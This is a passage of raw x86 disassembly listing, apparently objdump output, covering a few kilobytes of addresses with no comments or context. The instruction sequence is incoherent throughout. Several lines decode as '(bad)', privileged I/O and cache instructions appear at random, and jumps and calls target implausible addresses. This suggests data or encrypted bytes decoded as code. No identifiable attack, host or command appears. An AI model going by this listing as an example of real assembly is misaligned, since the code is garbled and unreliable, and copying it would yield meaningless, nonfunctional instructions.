  40b9be:	pop    edi
  40b9bf:	fwait
  40b9c0:	and    al,0xb6
  40b9c2:	and    esi,DWORD PTR ds:0xa2499b2b
  40b9c8:	popa   
  40b9c9:	jmp    0x9aa789e8
  40b9ce:	int    0x3a
  40b9d0:	pop    es
  40b9d1:	sar    WORD PTR [edx-0x18],0x53
  40b9d6:	ret    0xdf3e
  40b9d9:	jo     0x40ba42
  40b9db:	mov    dh,0xbd
  40b9dd:	mov    ah,0x7b
  40b9df:	mov    al,0x5c
  40b9e1:	or     eax,0xc4c5f6f1
  40b9e6:	into   
  40b9e7:	shl    ah,cl
  40b9e9:	imul   ebp,esi,0xffffff9f
  40b9ec:	jne    0x40b973
  40b9ee:	vmwrite eax,ecx
  40b9f1:	aad    0x15
  40b9f3:	sbb    eax,DWORD PTR [edx]
  40b9f5:	and    esp,DWORD PTR [edi]
  40b9f7:	mov    edi,0xbb8dba95
  40b9fc:	call   0x69145aa
  40ba01:	adc    BYTE PTR [edi],ah
  40ba03:	add    BYTE PTR [ecx+0x73],dl
  40ba06:	cmp    eax,0x14478e45
  40ba0b:	test   al,0x31
  40ba0d:	mov    esp,0xb83abbb8
  40ba12:	ror    DWORD PTR [edi+ebx*4+0x59],1
  40ba16:	sub    al,0xf7
  40ba18:	jmp    0x149b815d
  40ba1d:	(bad)
  40ba20:	int    0x1f
  40ba22:	rcl    DWORD PTR [edi+0x2d49751d],0xee
  40ba29:	inc    eax
  40ba2a:	add    DWORD PTR [ebp-0x61],esp
  40ba2d:	fs jo  0x40ba64
  40ba30:	or     edx,DWORD PTR [ebp+esi*4-0x72]
  40ba34:	pop    ss
  40ba35:	stc    
  40ba36:	adc    BYTE PTR [edi-0x6f],cl
  40ba39:	arpl   WORD PTR [edi-0x3502ba78],ax
  40ba3f:	mul    DWORD PTR [esp+eax*4+0x5c]
  40ba43:	call   0xa84a1cc2
  40ba48:	wbinvd 
  40ba4a:	jns    0x40bac5
  40ba4c:	push   eax
  40ba4d:	icebp  
  40ba4e:	aas    
  40ba4f:	jp     0x40ba86
  40ba51:	inc    ebp
  40ba52:	imul   DWORD PTR [edi+0x20848c02]
  40ba58:	jle    0x40ba2d
  40ba5a:	mov    cl,0x15
  40ba5c:	mov    DWORD PTR [esi],edx
  40ba5e:	sbb    DWORD PTR [ebp+0x58],ebx
  40ba61:	(bad)  
  40ba62:	fadd   QWORD PTR [ecx+0x2a]
  40ba65:	div    BYTE PTR [esi+0x3722f45b]
  40ba6b:	sbb    eax,DWORD PTR [ebx-0x39a400a8]
  40ba71:	and    BYTE PTR [ecx],ah
  40ba73:	inc    edi
  40ba74:	in     al,dx
  40ba75:	leave  
  40ba76:	mov    bl,0xb8
  40ba78:	mov    al,ds:0xb597126d
  40ba7d:	and    DWORD PTR ds:0x21f68444,ebx
  40ba83:	sub    bh,bh
  40ba85:	mov    esp,0xec3f8525
  40ba8a:	ja     0x40ba2f
  40ba8c:	and    eax,0x36f12686
  40ba91:	mov    ah,0x5b
  40ba93:	mov    eax,0x27d9c5ac
  40ba98:	repnz pop ecx
  40ba9a:	dec    eax
  40ba9b:	js     0x40baad
  40ba9d:	mov    edi,0xc5bd24a6
  40baa2:	mov    dl,0x32
  40baa4:	pop    ecx
  40baa5:	xchg   BYTE PTR [edx-0x7c],cl
  40baa8:	adc    BYTE PTR [ebp+eax*8-0x7a8b8e71],bl
  40baaf:	clc    
  40bab0:	dec    esi
  40bab1:	(bad)  
  40bab2:	jp     0x40ba7e
  40bab4:	mov    dh,0x43
  40bab6:	push   ebp
  40bab7:	sub    esi,edx
  40bab9:	adc    al,0x24
  40babb:	inc    ebx
  40babc:	jl     0x40ba83
  40babe:	sbb    DWORD PTR [ecx+0x75],edi
  40bac1:	test   DWORD PTR [edx+0x28],ebx
  40bac4:	fld    DWORD PTR [ebp-0x681b1aa0]
  40baca:	stc    
  40bacb:	xchg   ebx,eax
  40bacc:	pop    es
  40bacd:	push   esp
  40bace:	add    al,BYTE PTR [eax]
  40bad0:	inc    edx
  40bad1:	dec    esi
  40bad2:	out    dx,eax
  40bad3:	sar    DWORD PTR [edi+0x4b61f028],cl
  40bad9:	add    al,0xf0
  40badb:	add    dl,BYTE PTR [esi]
  40badd:	scas   eax,DWORD PTR es:[edi]
  40bade:	mov    BYTE PTR [esi+0x39fde95a],dh
  40bae4:	pusha  
  40bae5:	and    DWORD PTR [ecx],ecx
  40bae7:	test   DWORD PTR gs:[ebx],eax
  40baea:	mov    eax,DWORD PTR [edx-0x48]
  40baed:	loop   0x40bb3a
  40baef:	sbb    al,0x88
  40baf1:	loope  0x40bac9
  40baf3:	xor    al,BYTE PTR [ebp-0xe10b5b4]
  40baf9:	fwait
  40bafa:	bound  edx,QWORD PTR [eax+0x1d]
  40bafd:	sbb    DWORD PTR [esi+0x3c],eax
  40bb00:	dec    ebp
  40bb01:	mov    ecx,0x15b4d504
  40bb06:	cmp    al,0x72
  40bb08:	pop    esp
  40bb09:	jl     0x40bb2a
  40bb0b:	repnz adc al,0x1c
  40bb0e:	mov    bh,0x7a
  40bb10:	xor    ah,bl
  40bb12:	pop    esi
  40bb13:	sub    eax,0xd0d8e85f
  40bb18:	sbb    BYTE PTR [esi-0x4be36daf],al
  40bb1e:	or     DWORD PTR [eax],edi
  40bb20:	push   ebp
  40bb21:	add    al,0xda
  40bb23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb24:	push   cs
  40bb25:	addr16 jle 0x40bb7b
  40bb28:	mov    esi,0xcee66228
  40bb2d:	push   ebx
  40bb2e:	loop   0x40bafb
  40bb30:	add    al,0x36
  40bb32:	das    
  40bb33:	push   ecx
  40bb34:	mov    BYTE PTR [ecx],al
  40bb36:	in     al,dx
  40bb37:	int3   
  40bb38:	pop    edi
  40bb39:	ds jbe 0x40baf7
  40bb3c:	imul   esi,ebp,0x8ff51ddc
  40bb42:	mov    ds:0x5c108785,al
  40bb47:	cmp    esp,ecx
  40bb49:	xor    cl,dl
  40bb4b:	in     al,dx
  40bb4c:	and    DWORD PTR [ecx+0x3a],ecx
  40bb4f:	xchg   BYTE PTR ds:0xfbccd185,dh
  40bb55:	and    al,0x5e
  40bb57:	adc    edx,eax
  40bb59:	jns    0x40bb60
  40bb5b:	iret   
  40bb5c:	bound  edx,QWORD PTR [ecx]
  40bb5e:	dec    ebx
  40bb5f:	iret   
  40bb60:	jl     0x40bb9c
  40bb62:	dec    esi
  40bb63:	cdq    
  40bb64:	jmp    0x62f57b4d
  40bb69:	xor    eax,0xeb60e4b2
  40bb6e:	xchg   ebx,eax
  40bb6f:	or     bl,BYTE PTR [edi-0x6aba30a0]
  40bb75:	arpl   WORD PTR [edx+0x65f7ec75],bp
  40bb7b:	xchg   ebp,eax
  40bb7c:	xor    ebx,DWORD PTR [ecx-0x38733c38]
  40bb82:	out    0x26,al
  40bb84:	adc    BYTE PTR [edx],al
  40bb86:	loopne 0x40bb76
  40bb88:	daa    
  40bb89:	mov    esi,0xcc25a3c6
  40bb8e:	pusha  
  40bb8f:	stc    
  40bb90:	scas   eax,DWORD PTR es:[edi]
  40bb91:	sub    WORD PTR [edi],si
  40bb94:	dec    esi
  40bb95:	imul   edx,DWORD PTR [ecx],0x3e
  40bb98:	sbb    DWORD PTR ds:0xe81b0b60,edx
  40bb9e:	and    BYTE PTR [edi+0x3d],dl
  40bba1:	inc    esi
  40bba2:	stos   BYTE PTR es:[edi],al
  40bba3:	out    0xa9,al
  40bba5:	add    al,0x70
  40bba7:	test   DWORD PTR ds:0xb0abe7b2,eax
  40bbad:	sbb    BYTE PTR [ecx+0x24d91aad],bh
  40bbb3:	add    dh,BYTE PTR [esi-0xd]
  40bbb6:	and    eax,0x6f99a9ee
  40bbbb:	lods   eax,DWORD PTR ds:[esi]
  40bbbc:	sub    eax,0x32ef4ddb
  40bbc1:	inc    esi
  40bbc2:	sub    ecx,DWORD PTR [ebx]
  40bbc4:	in     al,0x94
  40bbc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbc7:	xchg   ebx,eax
  40bbc8:	not    DWORD PTR [esi*2+0x22c8da33]
  40bbcf:	aam    0x10
  40bbd1:	or     BYTE PTR gs:[esi+0x2f],0x86
  40bbd6:	pop    esp
  40bbd7:	mov    edi,0xf30006d3
  40bbdc:	fucomi st,st(3)
  40bbde:	daa    
  40bbdf:	sbb    bl,BYTE PTR [ecx+0x4b47b0f4]
  40bbe5:	loopne 0x40bbfc
  40bbe7:	hlt    
  40bbe8:	in     eax,0x20
  40bbea:	push   eax
  40bbeb:	and    DWORD PTR [ecx-0x71],ecx
  40bbee:	int3   
  40bbef:	and    esp,edx
  40bbf1:	push   ebx
  40bbf2:	inc    esp
  40bbf3:	lahf   
  40bbf4:	mov    ebp,0x793e004
  40bbf9:	cmp    edi,ebx
  40bbfb:	push   esi
  40bbfc:	xchg   BYTE PTR [edx-0x4ec6580d],dl
  40bc02:	inc    edx
  40bc03:	call   0x8d82512e
  40bc08:	fsubp  st(0),st
  40bc0a:	xor    BYTE PTR [edi],dl
  40bc0c:	popa   
  40bc0d:	inc    esp
  40bc0e:	or     edx,DWORD PTR [eax+0x2c]
  40bc11:	mov    eax,ds:0x12ef99a9
  40bc16:	popf   
  40bc17:	shl    DWORD PTR [ecx],cl
  40bc19:	fimul  DWORD PTR [esi+eiz*8-0x40]
  40bc1d:	outs   dx,DWORD PTR ds:[esi]
  40bc1e:	push   ss
  40bc1f:	xchg   BYTE PTR [edi-0x74],ah
  40bc22:	nop
  40bc23:	repnz push 0xae52cf5f
  40bc29:	(bad)  
  40bc2a:	(bad)  
  40bc2b:	repz cmp ah,dh
  40bc2e:	adc    al,0xe2
  40bc30:	int3   
  40bc31:	mov    DWORD PTR [eax+ecx*2-0x6c458ec0],ecx
  40bc38:	inc    esi
  40bc39:	sub    al,0xd8
  40bc3b:	add    DWORD PTR [edi-0x47],eax
  40bc3e:	sbb    BYTE PTR [ecx+0x78bba520],0x19
  40bc45:	xor    ah,BYTE PTR gs:[ecx]
  40bc48:	xor    al,0x2d
  40bc4a:	sub    ch,ah
  40bc4c:	(bad)  
  40bc4e:	adc    al,0x6e
  40bc50:	pop    eax
  40bc51:	sti    
  40bc52:	in     eax,0xff
  40bc54:	mov    eax,fs
  40bc56:	inc    esi
  40bc57:	inc    eax
  40bc58:	and    ah,dl
  40bc5a:	mov    fs,esi
  40bc5c:	sar    BYTE PTR [ebx-0x6c],0x71
  40bc60:	mov    ds:0x412bcf96,al
  40bc65:	in     eax,0xb7
  40bc67:	sti    
  40bc68:	jecxz  0x40bbfe
  40bc6a:	les    edi,FWORD PTR [edi-0x42]
  40bc6d:	jae    0xd822061e
  40bc73:	push   ss
  40bc74:	add    al,0xda
  40bc76:	or     al,0x2f
  40bc78:	mov    fs,WORD PTR [ebx-0x48]
  40bc7b:	mov    ah,0x31
  40bc7d:	sbb    al,0x8b
  40bc7f:	dec    edi
  40bc80:	lock mov BYTE PTR [ebp-0x2272007e],ch
  40bc87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc88:	inc    eax
  40bc89:	adc    ebx,esp
  40bc8b:	mov    dl,0x46
  40bc8d:	dec    edx
  40bc8e:	arpl   WORD PTR [ecx-0x28],bx
  40bc91:	sub    bl,BYTE PTR [ebp+0x768044f6]
  40bc97:	aaa    
  40bc98:	mov    al,0x32
  40bc9a:	inc    ebx
  40bc9b:	pop    ebx
  40bc9c:	pop    edi
  40bc9d:	pop    ss
  40bc9e:	arpl   WORD PTR [ebx-0x11f714b2],bx
  40bca4:	hlt    
  40bca5:	(bad)  [ebx+ebx*2+0x660baa5c]
  40bcac:	in     eax,dx
  40bcad:	cwde   
  40bcae:	cmp    al,al
  40bcb0:	ret    0x8196
  40bcb3:	(bad)  
  40bcb4:	push   ss
  40bcb5:	rcr    BYTE PTR [edx],cl
  40bcb7:	sub    esi,DWORD PTR [edx]
  40bcb9:	scas   al,BYTE PTR es:[edi]
  40bcba:	fs jno 0x40bc7b
  40bcbd:	retf   
  40bcbe:	ftst   
  40bcc0:	sahf   
  40bcc1:	or     DWORD PTR [ebx+edi*2-0x14917e66],eax
  40bcc8:	add    al,0x48
  40bcca:	pop    esp
  40bccb:	jmp    0x3c7e6b1a
  40bcd0:	lahf   
  40bcd1:	pop    edi
  40bcd2:	lds    ebx,FWORD PTR [ecx]
  40bcd4:	mov    ds:0xa2ee29dc,eax
  40bcd9:	xchg   edi,eax
  40bcda:	das    
  40bcdb:	int    0x2
  40bcdd:	jl     0x40bc6b
  40bcdf:	mov    WORD PTR [eax-0x7c],?
  40bce2:	pop    es
  40bce3:	jp     0x40bd35
  40bce5:	cmp    eax,DWORD PTR [edx-0x40]
  40bce8:	pop    edx
  40bce9:	rol    DWORD PTR [eax+0x5e],0xe0
  40bced:	retf   0x65e7
  40bcf0:	scas   eax,DWORD PTR es:[edi]
  40bcf1:	aaa    
  40bcf2:	mov    eax,0x333e2677
  40bcf7:	add    eax,0x2dc5449b
  40bcfc:	fiadd  DWORD PTR [edx+0x49]
  40bcff:	out    dx,eax
  40bd00:	push   es
  40bd01:	add    al,0xc2
  40bd03:	bsr    edi,DWORD PTR [ecx+0x2863e034]
  40bd0a:	cdq    
  40bd0b:	(bad)  
  40bd0c:	dec    esp
  40bd0d:	mov    BYTE PTR [edx+0x2e],ah
  40bd10:	push   esi
  40bd11:	repz inc esi
  40bd13:	out    dx,al
  40bd14:	jecxz  0x40bd52
  40bd16:	add    bl,cl
  40bd18:	(bad)  [ebp-0x42]
  40bd1b:	add    DWORD PTR [edx],0x53
  40bd1e:	sbb    eax,0x7bb55c12
  40bd23:	in     eax,dx
  40bd24:	data16 adc ah,BYTE PTR [ebp+0x75]
  40bd28:	call   0xbc25704
  40bd2d:	and    eax,0xd91c25b
  40bd32:	jl     0x40bd68
  40bd34:	inc    esp
  40bd35:	adc    al,0xdf
  40bd37:	xchg   esi,eax
  40bd38:	outs   dx,DWORD PTR ds:[esi]
  40bd39:	es jle 0x40bcff
  40bd3c:	ret    
  40bd3d:	pop    ecx
  40bd3e:	imul   esp,DWORD PTR [edi-0x1d],0x9da93cca
  40bd45:	xor    DWORD PTR [esi],edi
  40bd47:	jo     0x40bd57
  40bd49:	clc    
  40bd4a:	bnd js 0x40bd3a
  40bd4d:	jmp    0xd584:0x7cf4fcfc
  40bd54:	(bad)  
  40bd55:	pushf  
  40bd56:	std    
  40bd57:	jp     0x40bd22
  40bd59:	or     ecx,DWORD PTR [ebp+eax*2-0x343cc16c]
  40bd60:	xor    eax,eax
  40bd62:	imul   edx,esp,0x63df8771
  40bd68:	pop    ebp
  40bd69:	pusha  
  40bd6a:	jns    0x40bd8a
  40bd6c:	xchg   esp,eax
  40bd6d:	xchg   edx,eax
  40bd6e:	sub    BYTE PTR [edi+0x2f6ad9ce],0xc6
  40bd75:	mov    ss,ebx
  40bd77:	pusha  
  40bd78:	push   ebp
  40bd79:	add    eax,0x4a58b288
  40bd7e:	test   al,0x12
  40bd80:	and    cl,BYTE PTR [edx]
  40bd82:	shl    cl,0xa9
  40bd85:	mov    ch,0xc0
  40bd87:	mov    ch,0xbd
  40bd89:	int    0x45
  40bd8b:	mov    BYTE PTR cs:[ecx],dl
  40bd8e:	es and al,0x54
  40bd91:	clc    
  40bd92:	jb     0x40bdee
  40bd94:	bound  edi,QWORD PTR [ecx-0x84b866e]
  40bd9a:	push   ebp
  40bd9b:	dec    ecx
  40bd9c:	jl     0x40bd50
  40bd9e:	jno    0x40bd9b
  40bda0:	(bad)  
  40bda1:	leave  
  40bda2:	mov    dh,0x90
  40bda4:	push   ebp
  40bda5:	fisttp WORD PTR [edx-0x49e2f158]
  40bdab:	test   cl,ch
  40bdad:	aad    0xae
  40bdaf:	ss xor esi,0x2d3c9fa8
  40bdb6:	sbb    bl,BYTE PTR [edi]
  40bdb8:	push   edi
  40bdb9:	fstp   DWORD PTR gs:[ebx]
  40bdbc:	ds jp  0x40bdb5
  40bdbf:	push   ebx
  40bdc0:	mov    ds:0xac94a95f,eax
  40bdc5:	scas   eax,DWORD PTR es:[edi]
  40bdc6:	xchg   edx,eax
  40bdc7:	lea    edi,[ebx+eax*4+0x17]
  40bdcb:	out    0x15,al
  40bdcd:	ficomp DWORD PTR [edi-0x4d147de2]
  40bdd3:	fdivr  QWORD PTR [ebx+0x7a255f87]
  40bdd9:	and    DWORD PTR [edi+0x47],0xffffffb9
  40bddd:	ja     0x40be4a
  40bddf:	xor    eax,0xac9e8996
  40bde4:	add    BYTE PTR [ebx],0x1
  40bde7:	dec    edi
  40bde8:	ds gs xchg edx,eax
  40bdeb:	enter  0x51b4,0xce
  40bdef:	push   es
  40bdf0:	imul   edx,DWORD PTR [ebp-0x5f],0x53
  40bdf4:	mov    bh,0x98
  40bdf6:	test   dh,0xa8
  40bdf9:	xor    BYTE PTR [edi],cl
  40bdfb:	lods   al,BYTE PTR ds:[esi]
  40bdfc:	enter  0xc102,0xe9
  40be00:	add    cl,BYTE PTR [ebx-0x7a165fb3]
  40be06:	add    eax,0xfd7d0000
  40be0b:	or     BYTE PTR [edx+eax*4],0x79
  40be0f:	js     0x40be8d
  40be11:	xor    edi,DWORD PTR [edx-0x34]
  40be14:	outs   dx,BYTE PTR ds:[esi]
  40be15:	sahf   
  40be16:	mov    ecx,edi
  40be18:	push   0x1616e81f
  40be1d:	cmp    eax,0x33161604
  40be22:	pop    ss
  40be23:	pusha  
  40be24:	adc    al,0x7f
  40be26:	xchg   DWORD PTR [eax-0x3c],ebp
  40be29:	aam    0xe3
  40be2b:	les    esp,FWORD PTR [eax]
  40be2d:	push   esp
  40be2e:	(bad)  
  40be2f:	mov    ah,BYTE PTR [eax]
  40be31:	inc    BYTE PTR ds:0xeeef438b
  40be37:	sbb    al,0xad
  40be39:	popa   
  40be3a:	mov    ds:0x2899d561,eax
  40be3f:	xlat   BYTE PTR ds:[ebx]
  40be40:	pop    ds
  40be41:	retf   0xdc9
  40be44:	arpl   WORD PTR [ebp-0x3c],bx
  40be47:	popa   
  40be48:	shr    BYTE PTR [eax],cl
  40be4a:	mov    ebp,0x55cd2fcd
  40be4f:	(bad)  [ecx+0xd5bb69e]
  40be55:	mov    DWORD PTR [esi-0x8],ebp
  40be58:	and    al,0xe8
  40be5a:	(bad)  
  40be5b:	call   0x533ea16a
  40be60:	scas   al,BYTE PTR es:[edi]
  40be61:	mov    ds:0x4a93af83,al
  40be66:	adc    DWORD PTR ds:0xd5631ae2,0x2
  40be6d:	in     eax,0x2a
  40be6f:	xchg   ecx,ecx
  40be71:	iret   
  40be72:	fdiv   DWORD PTR [ebp+0x5ccea813]
  40be78:	xchg   esi,eax
  40be79:	pop    es
  40be7a:	and    al,0x6e
  40be7c:	mov    bl,0xf2
  40be7e:	cdq    
  40be7f:	je     0x40be9e
  40be81:	push   ecx
  40be82:	push   ecx
  40be83:	neg    BYTE PTR [edi+0x13]
  40be86:	test   al,0xa
  40be88:	add    eax,0x203516ee
  40be8d:	or     BYTE PTR [ebx-0x35],0x3e
  40be91:	sahf   
  40be92:	loop   0x40be75
  40be94:	fwait
  40be95:	jnp    0x40be9a
  40be97:	adc    eax,0xa3a1c114
  40be9c:	sub    BYTE PTR [ebx],ah
  40be9e:	pop    ebp
  40be9f:	pusha  
  40bea0:	aaa    
  40bea1:	int3   
  40bea2:	mov    ebx,0x71cb5388
  40bea7:	jo     0x40beed
  40bea9:	in     eax,0x28
  40beab:	pop    ebx
  40beac:	inc    bl
  40beae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beaf:	jmp    0x40be7a
  40beb1:	mov    esp,0x1a6d3ab3
  40beb6:	sub    al,0xf7
  40beb8:	cld    
  40beb9:	test   DWORD PTR [edi+0x580ae168],eax
  40bebf:	pop    esi
  40bec0:	(bad)  
  40bec1:	cmp    ebp,DWORD PTR [eax-0x3]
  40bec4:	int3   
  40bec5:	push   ds
  40bec6:	jl     0x40be7e
  40bec8:	ds jae 0x40bf3e
  40becb:	mov    bl,al
  40becd:	sbb    dl,BYTE PTR [edx-0x3b9bef43]
  40bed3:	mov    ebx,0x27654b7d
  40bed8:	in     eax,dx
  40bed9:	int    0x1b
  40bedb:	add    al,0x4a
  40bedd:	push   cs
  40bede:	(bad)  [eax+0x36]
  40bee1:	mov    ch,0xce
  40bee3:	mov    eax,esp
  40bee5:	cmp    eax,DWORD PTR [eax+0x44]
  40bee8:	xor    al,0x82
  40beea:	aad    0x36
  40beec:	sbb    BYTE PTR [ebp+0x31],ah
  40beef:	pop    ds
  40bef0:	pop    es
  40bef1:	jmp    0x1344e91f
  40bef6:	(bad)  
  40bef7:	sti    
  40bef8:	fdiv   DWORD PTR [eax]
  40befa:	fucomp st(6)
  40befc:	jle    0x40be99
  40befe:	mov    DWORD PTR [ecx-0x2d],esi
  40bf01:	xor    DWORD PTR [ebx-0x78],0xc69f3d55
  40bf08:	rcl    DWORD PTR [esi-0x25],1
  40bf0b:	adc    al,0xc1
  40bf0d:	js     0x40befb
  40bf0f:	and    cl,BYTE PTR [ecx-0x5e]
  40bf12:	pop    esp
  40bf13:	xchg   ebx,eax
  40bf14:	test   ecx,esp
  40bf16:	jno    0x40bf2d
  40bf18:	iret   
  40bf19:	in     al,0x22
  40bf1b:	mov    dl,0xbb
  40bf1d:	sub    edx,DWORD PTR [ebx]
  40bf1f:	xor    BYTE PTR [ebx-0x44],0x95
  40bf23:	pop    esi
  40bf24:	inc    edi
  40bf25:	cmp    dh,BYTE PTR [esi]
  40bf27:	jg     0x40bf33
  40bf29:	ds into 
  40bf2b:	das    
  40bf2c:	sahf   
  40bf2d:	mov    ds:0x4fdce38e,eax
  40bf32:	add    BYTE PTR [ecx-0x2dc5f93c],0xb
  40bf39:	dec    ebp
  40bf3a:	daa    
  40bf3b:	scas   al,BYTE PTR es:[edi]
  40bf3c:	pop    DWORD PTR [eax]
  40bf3e:	xlat   BYTE PTR ds:[ebx]
  40bf3f:	pop    ecx
  40bf40:	sub    al,0xe1
  40bf42:	fild   QWORD PTR [ecx]
  40bf44:	(bad)  
  40bf45:	sahf   
  40bf46:	stos   BYTE PTR es:[edi],al
  40bf47:	dec    ecx
  40bf48:	prefetch BYTE PTR fs:[esi*4-0x1c009db9]
  40bf51:	adc    DWORD PTR [ebx-0xd],ecx
  40bf54:	xchg   ebp,eax
  40bf55:	shr    BYTE PTR [esi+ecx*1],0x46
  40bf59:	xchg   esp,eax
  40bf5a:	repnz out 0x8d,al
  40bf5d:	xor    BYTE PTR [ebx-0x1ef3abb7],ah
  40bf63:	jb     0x40bfaf
  40bf65:	ds mov esp,0x90f858f7
  40bf6b:	std    
  40bf6c:	mov    bh,0xd0
  40bf6e:	jo     0x40bf9c
  40bf70:	out    0x5b,al
  40bf72:	pop    ebx
  40bf73:	add    al,0x5
  40bf75:	sbb    al,0xbf
  40bf77:	lods   eax,DWORD PTR ds:[esi]
  40bf78:	sub    BYTE PTR [edi-0x12fde5ce],0xa0
  40bf7f:	and    eax,DWORD PTR [edx+ebp*4+0x62ff7b99]
  40bf86:	and    edx,DWORD PTR [ebp-0x19]
  40bf89:	adc    eax,0x756e7173
  40bf8e:	sbb    DWORD PTR [ebp+ecx*2+0x45],ecx
  40bf92:	push   eax
  40bf93:	jo     0x40bf61
  40bf95:	push   sp
  40bf97:	retf   
  40bf98:	imul   esi,DWORD PTR [eax+0x21e0a469],0xffffffa8
  40bf9f:	pop    ebx
  40bfa0:	out    0x36,eax
  40bfa2:	jb     0x40bfae
  40bfa4:	sbb    al,0xea
  40bfa6:	and    edx,0xffffffb7
  40bfa9:	jbe    0x40c01e
  40bfab:	or     bl,BYTE PTR [ebp+edx*1+0x69188255]
  40bfb2:	add    dl,dl
  40bfb4:	pop    ds
  40bfb5:	mov    al,0xaf
  40bfb7:	neg    DWORD PTR [edx]
  40bfb9:	and    dh,BYTE PTR [edi+0xc87b963]
  40bfbf:	push   0x5c2e03fc
  40bfc4:	jo     0x40c03c
  40bfc6:	js     0x40bf5e
  40bfc8:	into   
  40bfc9:	cmp    BYTE PTR [eax],bl
  40bfcb:	aaa    
  40bfcc:	ins    BYTE PTR es:[edi],dx
  40bfcd:	mov    al,ds:0xee2ac9b0
  40bfd2:	push   es
  40bfd3:	test   DWORD PTR [ecx+eax*1],edx
  40bfd6:	mov    ebx,0xe262ec37
  40bfdb:	sub    eax,0x3395babc
  40bfe0:	test   BYTE PTR [edi+esi*2-0xa883581],al
  40bfe7:	scas   eax,DWORD PTR es:[edi]
  40bfe8:	lock sbb ch,dh
  40bfeb:	and    eax,0x1b7a42d5
  40bff0:	dec    ecx
  40bff1:	add    esp,DWORD PTR [eax+0x1fdc955]
  40bff7:	mov    bh,0xe6
  40bff9:	cli    
  40bffa:	xor    BYTE PTR ds:0x4aa03b0f,ah
  40c000:	mov    ebx,DWORD PTR [ebp+ebx*8-0x17ccab47]
  40c007:	inc    ebp
  40c008:	into   
  40c009:	dec    edi
  40c00a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c00b:	arpl   WORD PTR [edx],si
  40c00d:	sahf   
  40c00e:	test   eax,0x432da435
  40c013:	xchg   DWORD PTR [ebx-0x68],ebx
  40c016:	lea    ebp,[esi-0x78]
  40c019:	lods   al,BYTE PTR ds:[esi]
  40c01a:	pop    ebx
  40c01b:	test   DWORD PTR [esi],ecx
  40c01d:	adc    eax,DWORD PTR [ecx+0x520da7db]
  40c023:	mov    edi,0xcb59b9a5
  40c028:	ret    
  40c029:	lea    ebx,[edx]
  40c02b:	push   esp
  40c02c:	mov    WORD PTR [esi],cs
  40c02e:	push   ebx
  40c02f:	jnp    0x40c019
  40c031:	push   ebp
  40c032:	jle    0x40bfc9
  40c034:	or     bh,0x68
  40c037:	stos   DWORD PTR es:[edi],eax
  40c038:	add    DWORD PTR [esi+0x766d0036],esp
  40c03e:	xor    al,0xe9
  40c040:	rcl    DWORD PTR [ecx+ebp*1-0x6ff9c28c],0x48
  40c048:	and    esp,DWORD PTR [ebx-0x1a]
  40c04b:	cs daa 
  40c04d:	ret    0x15d7
  40c050:	imul   ebx,DWORD PTR [ebx-0x792da5c2],0x5b6c314d
  40c05a:	mov    esi,0xc586cf75
  40c05f:	pop    esp
  40c060:	nop
  40c061:	push   edi
  40c062:	sbb    DWORD PTR [esi+0x4f],esi
  40c065:	jg     0x40c02b
  40c067:	mov    edx,0x4ea55c8f
  40c06c:	adc    cl,BYTE PTR [ebx-0x1c54e45]
  40c072:	mov    edx,0xf3a2d82c
  40c077:	faddp  st(5),st
  40c079:	loope  0x40c0c8
  40c07b:	add    al,0x84
  40c07d:	fsubr  QWORD PTR [esp+eax*8]
  40c080:	scas   al,BYTE PTR es:[edi]
  40c081:	scas   al,BYTE PTR es:[edi]
  40c082:	call   0x34f6ad09
  40c087:	pop    ecx
  40c088:	cmp    DWORD PTR [eax+0x4a],eax
  40c08b:	enter  0x55f3,0xb8
  40c08f:	out    0xf7,al
  40c091:	add    edi,ebp
  40c093:	lahf   
  40c094:	push   ecx
  40c095:	loope  0x40c0cc
  40c097:	mov    ecx,0xd5b1f125
  40c09c:	lea    ebx,[eax+0x200ac5f8]
  40c0a2:	and    dl,BYTE PTR [ecx-0x28]
  40c0a5:	sahf   
  40c0a6:	adc    bl,dl
  40c0a8:	icebp  
  40c0a9:	aam    0x40
  40c0ab:	xchg   BYTE PTR [eax+0x27e92a03],al
  40c0b1:	push   es
  40c0b2:	and    ebx,DWORD PTR [ebp+0x6a]
  40c0b5:	repz retf 0x3f86
  40c0b9:	and    eax,0xb7845372
  40c0be:	mov    edx,0x26226a8c
  40c0c3:	cli    
  40c0c4:	aas    
  40c0c5:	dec    esp
  40c0c6:	pop    ss
  40c0c7:	jb     0x40c05f
  40c0c9:	cmp    al,0xe8
  40c0cb:	adc    BYTE PTR [edx-0x28ae5ef9],bl
  40c0d1:	fnsave [eax+0x30]
  40c0d4:	hlt    
  40c0d5:	pop    edx
  40c0d6:	mov    BYTE PTR [ebx],0x48
  40c0d9:	sbb    eax,0x28870f17
  40c0de:	rcl    DWORD PTR [ebx+eiz*4-0x61],0xa9
  40c0e3:	in     al,0x9d
  40c0e5:	imul   ebp,DWORD PTR [esi+ebx*8+0x5b],0xe6885732
  40c0ed:	pop    ecx
  40c0ee:	and    al,0x18
  40c0f0:	xchg   edx,eax
  40c0f1:	inc    eax
  40c0f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0f3:	and    eax,eax
  40c0f5:	mov    esi,DWORD PTR [edi]
  40c0f7:	sbb    dl,dh
  40c0f9:	ins    DWORD PTR es:[edi],dx
  40c0fa:	in     eax,0xb5
  40c0fc:	push   0xffffffda
  40c0fe:	shl    DWORD PTR [ebp-0x46],0x19
  40c102:	push   esp
  40c103:	sbb    ecx,ebp
  40c105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c106:	push   esp
  40c107:	push   edx
  40c108:	inc    esi
  40c109:	dec    ecx
  40c10a:	push   ds
  40c10b:	mov    ch,0x45
  40c10d:	jp     0x40c0ab
  40c10f:	xchg   esi,eax
  40c110:	mov    ecx,0xbbbcd5de
  40c115:	dec    ebx
  40c116:	and    al,0x1a
  40c118:	fs dec esi
  40c11a:	scas   al,BYTE PTR es:[di]
  40c11c:	inc    ebp
  40c11d:	and    BYTE PTR [esi],dh
  40c11f:	out    0xb5,eax
  40c121:	in     al,dx
  40c122:	inc    eax
  40c123:	inc    edx
  40c124:	or     eax,0x1c86d570
  40c129:	data16 cmp cl,0x1
  40c12d:	add    BYTE PTR [ecx],al
  40c12f:	dec    edx
  40c130:	in     al,0x9
  40c132:	or     DWORD PTR [di],ebx
